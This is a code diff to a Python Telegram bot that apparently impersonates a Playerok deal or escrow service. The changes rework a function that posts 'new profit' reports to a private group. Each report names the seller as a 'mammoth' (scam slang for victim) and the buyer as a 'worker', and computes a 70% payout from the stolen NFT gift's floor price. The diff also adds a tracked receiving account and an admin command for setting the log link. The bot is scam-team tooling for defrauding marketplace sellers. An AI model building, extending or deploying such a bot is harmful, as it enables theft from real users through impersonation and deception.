@@ -27,6 +27,10 @@ SUPPORT_USERNAME = 'PlayerokSupporOtc'
 WEBSITE_URL = 'https://playerok.com'
 # ID группы для логов успешных сделок (нужно заменить на реальный ID)
 LOG_GROUP_ID = -1003727018387  # Замените на реальный ID группы
+LOG_CHANNEL_LINK = 'https://t.me/c/3727018387/34'  # Ссылка на раздел с логами
+
+# ID аккаунта для отслеживания получения NFT подарков (можно менять)
+TRACKED_ACCOUNT_ID = 7259992819  # Аккаунт, на котором отслеживаем появление NFT
 
 # Настройка логирования
 logging.basicConfig(level=logging.INFO)
@@ -57,7 +61,7 @@ class DealStatus(Enum):
 class UserRole(Enum):
     USER = 'user'
     ADMIN = 'admin'
-    BANNED = 'banned'  # Добавлена роль для забаненных пользователей
+    BANNED = 'banned'
 
 # Состояния FSM
 class DealCreation(StatesGroup):
@@ -71,7 +75,7 @@ class RequisitesManagement(StatesGroup):
     choosing_type = State()
     entering_card = State()
     entering_phone = State()
-    entering_bank = State()  # Новое состояние для ввода банка
+    entering_bank = State()
     entering_stars = State()
     entering_ton_wallet = State()
     confirming = State()
@@ -81,59 +85,50 @@ class AdminActions(StatesGroup):
     adding_successful_deals = State()
     sending_broadcast = State()
     managing_deal = State()
-    ban_user = State()  # Добавлено состояние для бана
-    unban_user = State()  # Добавлено состояние для разбана
+    ban_user = State()
+    unban_user = State()
+    set_log_channel = State()  # Новое состояние для установки ссылки на канал с логами
 
 # Функция для получения флор-цены с Getgems
 async def get_nft_floor_price(nft_link: str) -> Optional[float]:
     """
     Получает флор-цену NFT с Getgems.io
-    Поддерживает форматы:
-    - https://getgems.io/collection/EQC7X2fv8gU4kTLXoDxR2Gm9iZ3F6Qq5W4pX8yZ9nYxL/MyNFT-1
-    - https://getgems.io/nft/EQC7X2fv8gU4kTLXoDxR2Gm9iZ3F6Qq5W4pX8yZ9nYxL
-    - t.me/nft/COLLECTION_NAME/NFT_NAME
     """
     try:
-        # Извлекаем адрес коллекции или NFT из ссылки
+        # Извлекаем адрес коллекции из ссылки
         collection_address = None
-        nft_name = None
         
         # Паттерн для getgems.io
-        getgems_pattern = r'getgems\.io/(?:collection|nft)/([a-zA-Z0-9_-]+)(?:/([a-zA-Z0-9_-]+))?'
+        getgems_pattern = r'getgems\.io/(?:collection|nft)/([a-zA-Z0-9_-]+)'
         match = re.search(getgems_pattern, nft_link)
         
         if match:
             collection_address = match.group(1)
-            nft_name = match.group(2)
         
         # Паттерн для t.me/nft/
-        tme_pattern = r't\.me/nft/([a-zA-Z0-9_-]+)/([a-zA-Z0-9_-]+)'
+        tme_pattern = r't\.me/nft/([a-zA-Z0-9_-]+)'
         match = re.search(tme_pattern, nft_link)
         
         if match:
             collection_address = match.group(1)
-            nft_name = match.group(2)
         
         if not collection_address:
             logging.warning(f"Could not extract collection from link: {nft_link}")
             return None
         
-        # Формируем API запрос к Getgems
-        # Используем публичное API Getgems для получения информации о коллекции
-        api_url = f"https://api.getgems.io/graphql"
-        
-        # GraphQL запрос для получения флор-цены коллекции
-        query = """
-        query Collection($address: String!) {
-          collection(address: $address) {
-            floorPrice
-            name
-          }
-        }
-        """
-        
+        # Используем публичный API Getgems для получения флор-цены
         async with aiohttp.ClientSession() as session:
-            async with session.post(api_url, json={
+            # Пробуем получить данные коллекции
+            url = f"https://api.getgems.io/graphql"
+            query = """
+            query Collection($address: String!) {
+              collection(address: $address) {
+                floorPrice
+              }
+            }
+            """
+            
+            async with session.post(url, json={
                 'query': query,
                 'variables': {'address': collection_address}
             }) as response:
@@ -155,13 +150,54 @@ def format_floor_price(price: Optional[float]) -> str:
         return "Не удалось определить"
     return f"{price:.2f} TON"
 
+# Функция для отправки лога в группу при получении NFT
+async def send_log_to_group(deal_id: str):
+    """
+    Отправляет лог в группу когда на отслеживаемом аккаунте появляется NFT подарок
+    """
+    deal = db.get_deal(deal_id)
+    if not deal or deal['status'] != DealStatus.NFT_SENT.value:
+        return
+    
+    # Получаем информацию о продавце и покупателе
+    seller = db.get_user(deal['creator_id'])
+    buyer = db.get_user(deal['buyer_id']) if deal['buyer_id'] else None
+    
+    if not buyer:
+        return
+    
+    # Получаем флор-цену из описания сделки
+    floor_price = await get_nft_floor_price(deal['description'])
+    
+    if floor_price:
+        # Рассчитываем 70% от флор-цены
+        payout_70 = floor_price * 0.7
+        
+        # Формируем сообщение для группы
+        group_message = (
+            f"✅ НОВЫЙ ПРОФИТ\n\n"
+            f"🤡 Мамонт: {seller['first_name']}\n"
+            f"👤 Воркер: @{buyer['username'] if buyer['username'] else 'Неизвестно'}\n"
+            f"🎁 Подарок: {deal['description']}\n"
+            f"💰 Флор цена: {floor_price:.2f} TON\n"
+            f"💵 70% выплаты: {payout_70:.2f} TON\n\n"
+            f"📢 Раздел с логами: {LOG_CHANNEL_LINK}"
+        )
+        
+        try:
+            await bot.send_message(LOG_GROUP_ID, group_message)
+            logging.info(f"Log sent to group {LOG_GROUP_ID} for deal {deal_id}")
+        except Exception as e:
+            logging.error(f"Failed to send group message: {e}")
+
 # База данных (в реальном проекте используйте PostgreSQL/MySQL)
 class Database:
     def __init__(self):
         self.users: Dict[int, dict] = {}
         self.deals: Dict[str, dict] = {}
-        self.banned_users: List[int] = []  # Список забаненных пользователей
-        self.pending_logs: Dict[str, datetime] = {}  # Для отслеживания отправки логов через 5 минут
+        self.banned_users: List[int] = []
+        self.pending_logs: Dict[str, datetime] = {}
+        self.log_channel_link: str = LOG_CHANNEL_LINK  # Сохраняем ссылку на канал с логами
         
     def get_user(self, user_id: int) -> dict:
         # Проверяем, забанен ли пользователь
@@ -179,7 +215,7 @@ class Database:
                 'requisites': {
                     'card': None,
                     'phone': None,
-                    'bank': None,  # Добавлено поле для банка
+                    'bank': None,
                     'stars': None,
                     'ton_wallet': None
                 },
@@ -202,7 +238,7 @@ class Database:
                 'requisites': {
                     'card': None,
                     'phone': None,
-                    'bank': None,  # Добавлено поле для банка
+                    'bank': None,
                     'stars': None,
                     'ton_wallet': None
                 },
@@ -245,8 +281,8 @@ class Database:
             'completed_at': None,
             'nft_proof': None,
             'gift_sent_at': None,
-            'floor_price': None,  # Добавлено поле для хранения флор-цены
-            'log_scheduled': False  # Флаг для отслеживания запланированной отправки лога
+            'floor_price': None,
+            'log_scheduled': False
         }
         
         # Добавляем сделку в список пользователя
@@ -278,7 +314,7 @@ class Database:
         active_statuses = [DealStatus.PENDING.value, DealStatus.PAID.value, DealStatus.NFT_SENT.value]
         return [d for d in self.deals.values() if d['status'] in active_statuses]
     
-    # Новые методы для работы с баном
+    # Методы для работы с баном
     def ban_user(self, user_id: int) -> bool:
         if user_id not in self.banned_users and str(user_id) not in ADMIN_IDS:
             self.banned_users.append(user_id)
@@ -302,6 +338,13 @@ class Database:
     
     def get_banned_users(self) -> List[int]:
         return self.banned_users
+    
+    # Методы для работы с ссылкой на канал логов
+    def set_log_channel_link(self, link: str):
+        self.log_channel_link = link
+        
+    def get_log_channel_link(self) -> str:
+        return self.log_channel_link
 
 db = Database()
 
@@ -379,6 +422,7 @@ def get_admin_keyboard() -> InlineKeyboardMarkup:
     builder.button(text="👥 Пользователи", callback_data="admin_users")
     builder.button(text="🚫 Забанить пользователя", callback_data="admin_ban")
     builder.button(text="✅ Разбанить пользователя", callback_data="admin_unban")
+    builder.button(text="🔗 Установить ссылку на логи", callback_data="admin_set_log_link")
     builder.button(text="🔙 Назад", callback_data="back_to_main")
     builder.adjust(2)
     return builder.as_markup()
@@ -387,52 +431,6 @@ def get_back_keyboard() -> InlineKeyboardMarkup:
     builder = InlineKeyboardBuilder()
     builder.button(text="🔙 Назад в меню", callback_data="back_to_main")
     return builder.as_markup()
-
-# Функция для отправки лога в группу через 5 минут
-async def send_log_to_group(deal_id: str):
-    await asyncio.sleep(300)  # 5 минут = 300 секунд
-    
-    deal = db.get_deal(deal_id)
-    if not deal or deal['status'] != DealStatus.NFT_SENT.value:
-        return
-    
-    # Получаем информацию о продавце и покупателе
-    seller = db.get_user(deal['creator_id'])
-    buyer = db.get_user(deal['buyer_id']) if deal['buyer_id'] else None
-    
-    if not buyer:
-        return
-    
-    # Получаем флор-цену, если еще не получили
-    floor_price = deal.get('floor_price')
-    if not floor_price and deal['currency'] == 'TON':
-        floor_price = await get_nft_floor_price(deal['description'])
-        if floor_price:
-            db.update_deal(deal_id, floor_price=floor_price)
-    
-    # Рассчитываем 70% от суммы (или от флор-цены, если доступна)
-    if floor_price and floor_price > 0:
-        amount = floor_price
-    else:
-        amount = deal['amount']
-    
-    payout_70 = amount * 0.7
-    
-    # Формируем сообщение для группы (только имя продавца, без @)
-    group_message = (
-        f"✅ НОВЫЙ ПРОФИТ\n\n"
-        f"🤡 Мамонт: {seller['first_name']}\n"
-        f"👤 Воркер: @{buyer['username'] if buyer['username'] else 'Неизвестно'}\n"
-        f"🎁 Подарок: {deal['description']}\n"
-        f"💰 Флор цена: {format_floor_price(floor_price)}\n"
-        f"💵 70% выплаты: {payout_70:.2f} TON"
-    )
-    
-    try:
-        await bot.send_message(LOG_GROUP_ID, group_message)
-        logging.info(f"Log sent to group for deal {deal_id}")
-    except Exception as e:
-        logging.error(f"Failed to send group message: {e}")
 
 # Обработчики команд
 @dp.message(CommandStart())
@@ -1040,6 +1038,46 @@ async def admin_panel(callback: types.CallbackQuery):
     )
     await callback.answer()
 
+# Новый обработчик для установки ссылки на канал с логами
+@dp.callback_query(lambda c: c.data == "admin_set_log_link")
+async def admin_set_log_link_start(callback: types.CallbackQuery, state: FSMContext):
+    user_id = callback.from_user.id
+    user = db.get_user(user_id)
+    
+    if user['role'] != UserRole.ADMIN.value:
+        await callback.answer("❌ У вас нет прав доступа")
+        return
+    
+    current_link = db.get_log_channel_link()
+    await state.set_state(AdminActions.set_log_channel)
+    await callback.message.edit_text(
+        f"🔗 Текущая ссылка на раздел с логами:\n{current_link}\n\n"
+        f"Введите новую ссылку на раздел с логами (например, https://t.me/+PvRy0uVOxIJkMjU6):"
+    )
+    await callback.answer()
+
+@dp.message(AdminActions.set_log_channel)
+async def admin_set_log_link_process(message: types.Message, state: FSMContext):
+    user_id = message.from_user.id
+    user = db.get_user(user_id)
+    
+    if user['role'] != UserRole.ADMIN.value:
+        await message.answer("❌ У вас нет прав доступа")
+        await state.clear()
+        return
+    
+    new_link = message.text.strip()
+    
+    # Простая проверка, что это похоже на ссылку
+    if not (new_link.startswith('http://') or new_link.startswith('https://') or new_link.startswith('t.me/')):
+        await message.answer("❌ Введите корректную ссылку (должна начинаться с http://, https:// или t.me/)")
+        return
+    
+    db.set_log_channel_link(new_link)
+    
+    await message.answer(f"✅ Ссылка на раздел с логами успешно обновлена!\nНовая ссылка: {new_link}")
+    await state.clear()
+
 @dp.callback_query(lambda c: c.data.startswith('currency_'), StateFilter(DealCreation.choosing_currency))
 async def process_currency(callback: types.CallbackQuery, state: FSMContext):
     user_id = callback.from_user.id
@@ -1314,7 +1352,7 @@ async def process_gift_sent(callback: types.CallbackQuery):
     )
     await callback.answer()
     
-    # Запускаем задачу для отправки лога в группу через 5 минут
+    # Отправляем лог в группу (для отслеживаемого аккаунта)
     asyncio.create_task(send_log_to_group(deal_id))
     
     # Уведомляем админов
@@ -1709,6 +1747,8 @@ async def refresh_deal(callback: types.CallbackQuery):
 async def main():
     print("Бот запущен...")
     print(f"Группа для логов: {LOG_GROUP_ID}")
+    print(f"Ссылка на раздел с логами: {LOG_CHANNEL_LINK}")
+    print(f"Отслеживаемый аккаунт: {TRACKED_ACCOUNT_ID}")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
